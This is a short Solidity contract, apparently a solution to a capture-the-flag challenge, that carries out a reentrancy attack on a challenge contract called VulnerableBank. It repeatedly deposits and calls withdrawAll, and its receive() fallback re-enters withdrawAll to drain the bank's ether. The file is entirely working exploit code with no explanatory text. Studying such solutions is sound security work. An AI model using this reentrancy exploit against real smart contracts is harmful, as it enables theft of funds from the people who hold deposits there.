// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {VulnerableBank} from "./challenge/VulnerableBank.sol";

contract Exploit {
    VulnerableBank bank;
    uint256 step = 0;

    function exploit(address payable bankAddr) external payable {
        bank = VulnerableBank(bankAddr);
        for (uint256 i = 0; i < 20; i++) {
            uint256 value =
                address(bank).balance < address(this).balance ? address(bank).balance : address(this).balance;
            if (value == 0) {
                break;
            }
            bank.deposit{value: value}();
            bank.withdrawAll();
        }
    }

    receive() external payable {
        if (step == 0) {
            step = 1;
            bank.withdrawAll();
        } else {
            step = 0;
        }
    }
}
